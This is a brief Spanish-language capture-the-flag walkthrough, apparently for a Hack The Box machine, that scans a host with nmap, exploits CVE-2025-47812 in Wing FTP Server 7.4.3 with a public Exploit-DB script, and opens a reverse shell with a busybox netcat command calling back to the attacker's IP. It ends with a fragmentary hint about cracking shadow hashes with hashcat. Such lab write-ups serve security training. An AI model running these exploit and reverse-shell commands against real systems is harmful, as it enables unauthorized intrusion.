
# Reconocimineto

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.6.141 -oG allPorts
```

```sehll
 [*] IP Address: 10.129.6.141
 [*] Open ports: 22,80
```

```shell
nmap -p22,80 -sCV -vvv 10.129.6.141 -oN targeted
```

EN la web encontramos un área de clientes bajo el subdominio `ftp.wingdata.htb`

Vemos que la versión es `Wing FTP Server v7.4.3` buscando en internet vemos que pertenece al `CVE-2025-47812`

# Explotacion
## CVE-2025-47812

Buscamos el exploit y nos lo descargamos para poder ejecutarlo `https://www.exploit-db.com/exploits/52347`

Lo ejecutamos buscando saber que usuario somos 
```shell
python3 52347.py -u http://ftp.wingdata.htb -c whoami
```

Nos devuelve que somos el usuario `wingftp`

Vamos a intentar mandarnos una reverse shell, despues de probar diferentes tipos de shell vemos que la nos ha funcionado es 
```shell
busybox nc 10.10.15.216 443 -e sh
```


Obtenemos una shell como como el usuario `wingftp`
shadow 256 hashcat
